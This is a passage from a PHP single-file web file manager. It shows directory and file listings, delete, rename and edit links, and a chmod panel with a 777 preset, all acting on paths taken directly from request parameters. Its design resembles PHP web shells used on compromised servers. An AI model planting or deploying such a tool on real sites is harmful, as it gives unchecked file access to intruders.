            <a href="?path=<?php echo urlencode($path); ?>"><?php echo htmlspecialchars($dir); ?></a>
        </div>
        <div class="size">--</div>
        <div class="perms <?php echo $isWritable ? 'writable' : 'not-writable'; ?>">
            <?php echo $perms; ?>
            <?php if ($isWritable): ?> ✓<?php endif; ?>
        </div>
        <div class="actions">
            <a href="?delete=<?php echo urlencode($path); ?>&path=<?php echo urlencode($currentPath); ?>" class="btn btn-danger btn-sm" onclick="return confirm('Delete this directory and all its contents?')">🗑️</a>
            <a href="?chmod=<?php echo urlencode($path); ?>&path=<?php echo urlencode($currentPath); ?>" class="btn btn-warning btn-sm">🔒</a>
            <form method="post" style="display: inline;">
                <input type="hidden" name="rename_action" value="1">
                <input type="hidden" name="old_path" value="<?php echo htmlspecialchars($path); ?>">
                <input type="text" name="new_name" value="<?php echo htmlspecialchars($dir); ?>" style="width: 80px; background: #0a0e17; border: 1px solid #2a3a5a; border-radius: 4px; color: #e8eaed; padding: 2px 6px; font-size: 11px;">
                <button type="submit" class="btn btn-ghost btn-sm">✏️</button>
            </form>
        </div>
    </div>
    <?php
    }
    
    // Display files
    foreach ($files as $file) {
        $path = $currentPath . '/' . $file;
        $size = filesize($path);
        $totalSize += $size;
        $sizeFormatted = formatSize($size);
        $perms = getFilePerms($path);
        $isWritable = is_writable($path);
        $isReadable = is_readable($path);
        $icon = getFileIcon($file);
        $ext = getFileExtension($file);
        $isEditable = isTextViewable($file);
    ?>
    <div class="file-item">
        <div class="name">
            <span class="icon"><?php echo $icon; ?></span>
            <a href="?fileloc=<?php echo urlencode($path); ?>&path=<?php echo urlencode($currentPath); ?>"><?php echo htmlspecialchars($file); ?></a>
        </div>
        <div class="size"><?php echo $sizeFormatted; ?></div>
        <div class="perms <?php echo $isWritable ? 'writable' : 'not-writable'; ?>">
            <?php echo $perms; ?>
            <?php if ($isWritable): ?> ✓<?php endif; ?>
        </div>
        <div class="actions">
            <?php if ($isEditable): ?>
                <a href="?fileloc=<?php echo urlencode($path); ?>&edit=1" class="btn btn-primary btn-sm">✏️</a>
            <?php endif; ?>
            <a href="?delete=<?php echo urlencode($path); ?>&path=<?php echo urlencode($currentPath); ?>" class="btn btn-danger btn-sm" onclick="return confirm('Delete this file?')">🗑️</a>
            <a href="?chmod=<?php echo urlencode($path); ?>&path=<?php echo urlencode($currentPath); ?>" class="btn btn-warning btn-sm">🔒</a>
            <form method="post" style="display: inline;">
                <input type="hidden" name="rename_action" value="1">
                <input type="hidden" name="old_path" value="<?php echo htmlspecialchars($path); ?>">
                <input type="text" name="new_name" value="<?php echo htmlspecialchars($file); ?>" style="width: 80px; background: #0a0e17; border: 1px solid #2a3a5a; border-radius: 4px; color: #e8eaed; padding: 2px 6px; font-size: 11px;">
                <button type="submit" class="btn btn-ghost btn-sm">✏️</button>
            </form>
        </div>
    </div>
    <?php
    }
    ?>
    
    <div class="stats">
        <span><?php echo count($directories); ?> directories, <?php echo count($files); ?> files</span>
        <span>Total size: <?php echo formatSize($totalSize); ?></span>
    </div>
</div>
<?php
}

// ============================================
// CHMOD POPUP (if requested)
// ============================================
if (isset($_GET['chmod']) && file_exists($_GET['chmod'])) {
    $chmodPath = $_GET['chmod'];
    $isDir = is_dir($chmodPath);
    $currentPerms = getFilePerms($chmodPath);
?>
<div style="background: #121a2a; border-radius: 12px; border: 1px solid #1a2a3a; padding: 25px; margin-top: 20px;">
    <h3 style="margin-bottom: 15px;">🔒 Change Permissions</h3>
    <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 15px; font-size: 14px; color: #6a7a9a;">
        <span><strong style="color: #e8eaed;">Path:</strong> <?php echo htmlspecialchars($chmodPath); ?></span>
        <span><strong style="color: #e8eaed;">Type:</strong> <?php echo $isDir ? 'Directory' : 'File'; ?></span>
        <span><strong style="color: #e8eaed;">Current:</strong> <?php echo $currentPerms; ?></span>
    </div>
    <form method="post" class="form-inline">
        <input type="hidden" name="chmod_action" value="1">
        <input type="hidden" name="chmod_path" value="<?php echo htmlspecialchars($chmodPath); ?>">
        <input type="text" name="chmod_perms" value="<?php echo $currentPerms; ?>" style="width: 80px; text-align: center; font-family: monospace; font-size: 18px;">
        <?php if ($isDir): ?>
            <label style="color: #6a7a9a; font-size: 13px;">
                <input type="checkbox" name="chmod_recursive" value="1"> Recursive
            </label>
        <?php endif; ?>
        <button type="submit" class="btn btn-primary">Apply</button>
        <a href="?path=<?php echo urlencode($currentPath); ?>" class="btn btn-ghost">Cancel</a>
    </form>
    <div style="margin-top: 12px; display: flex; gap: 8px; flex-wrap: wrap;">
        <button onclick="document.querySelector('input[name=chmod_perms]').value='644'" class="btn btn-ghost btn-sm">644</button>
        <button onclick="document.querySelector('input[name=chmod_perms]').value='755'" class="btn btn-ghost btn-sm">755</button>
        <button onclick="document.querySelector('input[name=chmod_perms]').value='777'" class="btn btn-ghost btn-sm">777</button>
        <button onclick="document.querySelector('input[name=chmod_perms]').value='600'" class="btn btn-ghost btn-sm">600</button>
        <button onclick="document.querySelector('input[name=chmod_perms]').value='640'" class="btn btn-ghost btn-sm">640</button>
        <button onclick="document.querySelector('input[name=chmod_perms]').value='660'" class="btn btn-ghost btn-sm">660</button>
    </div>
</div>
<?php
}

// ============================================
// FOOTER
// ============================================
?>
<div style="text-align: center; padding: 20px 0 10px; color: #2a3a5a; font-size: 12px; border-top: 1px solid #121a2a; margin-top: 30px;">
    <?php echo APP_NAME; ?> v<?php echo VERSION; ?> &bull; 
    PHP <?php echo phpversion(); ?> &bull; 
    <?php echo date('Y'); ?>
</div>

</div>
</body>
</html>